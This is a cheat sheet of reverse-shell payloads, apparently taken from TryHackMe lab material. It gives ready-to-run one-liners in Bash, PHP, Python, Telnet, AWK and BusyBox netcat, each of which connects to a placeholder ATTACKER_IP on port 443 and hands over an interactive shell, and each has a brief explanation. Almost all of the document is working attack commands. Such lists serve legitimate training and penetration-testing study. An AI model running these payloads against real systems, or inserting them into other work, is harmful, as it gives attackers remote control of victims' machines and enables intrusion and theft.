# Shell Payloads for Reverse Shells

## Bash

### Normal Bash Reverse Shell
```bash
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
This command initiates an interactive bash shell, redirecting input and output through a TCP connection to the attacker's IP on port 443.

### Bash Read Line Reverse Shell
```bash
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
This shell creates a new file descriptor (5) and connects to a TCP socket, reading and executing commands from the socket.

### Bash With File Descriptor 196 Reverse Shell
```bash
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
This command uses file descriptor 196 to establish a TCP connection, allowing for command input and output over the same connection.

### Bash With File Descriptor 5 Reverse Shell
```bash
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
Similar to the first example, but explicitly uses file descriptor 5 for input and output.

## PHP

### PHP Reverse Shell Using the exec Function
```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
Creates a socket connection to the attacker and executes a shell.

### PHP Reverse Shell Using the shell_exec Function
```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to the previous command but uses shell_exec for execution.

### PHP Reverse Shell Using the system Function
```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
Executes the command with the system function, outputting the result to the browser.

### PHP Reverse Shell Using the passthru Function
```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
Executes a command and sends raw output back to the browser.

### PHP Reverse Shell Using the popen Function
```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
Uses popen to open a process file pointer for executing the shell.

## Python

### Python Reverse Shell by Exporting Environment Variables
```bash
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
Sets up environment variables for the remote host and port, creating a socket connection and duplicating file descriptors.

### Python Reverse Shell Using the subprocess Module
```bash
target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
Uses the subprocess module for similar functionality as the previous command.

### Short Python Reverse Shell
```bash
target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
A more concise version that establishes the socket connection and redirects file descriptors.

## Others

### Telnet Reverse Shell
```bash
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
Creates a named pipe and connects via Telnet to the attacker.

### AWK Reverse Shell
```bash
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Uses AWK’s TCP capabilities to connect and execute commands.

### BusyBox Reverse Shell
```bash
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
This command uses BusyBox's Netcat to connect to the attacker and execute a shell.